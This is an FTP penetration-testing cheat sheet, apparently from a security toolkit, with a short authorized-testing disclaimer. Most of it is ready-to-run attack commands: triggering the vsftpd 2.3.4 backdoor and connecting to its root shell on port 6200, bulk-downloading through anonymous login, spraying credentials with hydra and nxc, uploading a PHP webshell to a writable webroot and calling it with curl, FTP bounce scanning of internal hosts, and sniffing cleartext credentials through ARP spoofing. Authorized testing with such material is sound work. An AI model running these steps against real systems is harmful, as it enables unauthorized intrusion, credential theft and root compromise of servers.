---
service: ftp
title: FTP
ports: 21
aliases: vsftpd, proftpd, pure-ftpd
---

# FTP — quick wins

**When you see it:** 21/tcp open, banner shows vsftpd/ProFTPD/pure-ftpd or similar →
check anonymous login first; any anonymous access or vsftpd 2.3.4 banner = immediate action.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to or interact
> with the target. Clean up uploaded files afterwards.

## Triage (read-only)
```sh
nc -nv H 21                                        # banner grab — note version
nmap -Pn -p21 --script ftp-anon,ftp-syst,ftp-bounce,ftp-vsftpd-backdoor H
curl -s --max-time 10 ftp://H/ --user "anonymous:anonymous@example.com"
curl -s ftp://H/ --user "anonymous:anonymous@example.com" -l  # list only
```

## Quick wins

### Anonymous login
```sh
ftp -n H
ftp> quote USER anonymous
ftp> quote PASS anonymous@example.com
ftp> ls -la
ftp> prompt off
ftp> mget *
```
*Why:* many legacy deployments leave anonymous enabled; you get unauthenticated read (and
sometimes write) of the FTP root. `mget *` bulk-downloads everything in scope.

### Download files with wget (passive mode off)
```sh
wget --no-passive -r ftp://anonymous:anonymous@H/
```
*Why:* `--no-passive` can bypass firewalls that block the FTP data channel; `-r` recurses
the full tree without an interactive session.

### vsftpd 2.3.4 backdoor — CVE-2011-2523 ✏️
```sh
# Step 1: trigger backdoor (any password; :) in username opens port 6200)
ftp H
Name: backdoor:)
Password: anything
# Step 2: catch root shell (separate terminal)
nc H 6200
```
*Why:* the supply-chain-compromised tarball (Jun–Jul 2011) spawns a root shell on 6200
when a username ending in `:)` is received. Verify with nmap `ftp-vsftpd-backdoor` NSE
before connecting. CVE-2011-2523.

### Credential reuse / spray
```sh
nxc ftp H -u USER -p PASS
hydra -l USER -P WORDLIST ftp://H
```
*Why:* FTP credentials are often reused from SSH, web app, or AD accounts; a valid hit
gives authenticated access and usually read/write of service directories.

### Upload to writable webroot ✏️
```sh
ftp -n H
ftp> quote USER USER
ftp> quote PASS PASS
ftp> cd /var/www/html       # adjust to actual webroot
ftp> put shell.php
# then: curl "http://H/shell.php?c=id"
```
*Why:* if FTP root overlaps with a web server's document root, a PHP webshell lands
immediately. Common on shared hosting and misconfigured lab boxes.

### FTP bounce scan (PORT command abuse)
```sh
nmap -Pn -p21 -b anonymous:anonymous@H INTERNAL_TARGET
```
*Why:* older FTP servers honour arbitrary `PORT` commands, letting you port-scan internal
hosts through the FTP server's outbound connection — useful when the target has inbound
filters but INTERNAL_TARGET is in a trusted zone.

### Plaintext sniff (on-path position)
```sh
tcpdump -i ETH -A -nn 'tcp port 21'
```
*Why:* FTP sends credentials and data in cleartext; on a shared segment or via ARP
spoofing you capture USER/PASS before writing a single packet to the server.

## aranum helpers
- `aranumtoolkit/network/enum-ftp.sh` — banner grab, anonymous probe via curl, nmap
  `ftp-anon/ftp-syst/ftp-bounce/ftp-vsftpd-backdoor`, optional nxc cred check.

## Gotchas
- `ftp-anon` NSE returning "Anonymous FTP login allowed" does not mean write access —
  confirm with a PUT attempt or directory listing.
- Passive mode (`PASV`) may be blocked by intervening NAT/firewall; switch to active mode
  (`ftp -A` or `--no-passive`) if data-channel connections time out.
- vsftpd 2.3.4 backdoor only exists in the compromised tarball; packages from distro repos
  are clean. Confirm version and origin via banner before wasting time on port 6200.
- FTP bounce is blocked by default in modern FTP daemons (ProFTPD `AllowForeignAddress off`,
  vsftpd `pasv_promiscuous=NO`). Try anyway — network gear and embedded systems often ship
  old defaults.

## Sources
- HackTricks `pentesting-ftp`; Hackviser FTP; Rapid7 `exploit/unix/ftp/vsftpd_234_backdoor`;
  Nmap NSE `ftp-vsftpd-backdoor`; CVE-2011-2523 (NVD).
